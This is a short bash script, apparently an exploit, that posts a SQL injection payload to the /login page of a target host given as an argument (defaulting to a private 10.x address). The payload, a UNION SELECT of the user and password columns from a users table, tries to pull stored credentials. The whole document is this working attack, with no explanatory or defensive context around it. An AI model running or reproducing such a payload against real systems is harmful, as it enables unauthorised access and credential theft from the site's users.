#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-10.201.0.20}"
curl -fsS -X POST -d "id=1' UNION SELECT user,password FROM users-- -" "http://$TARGET/login"
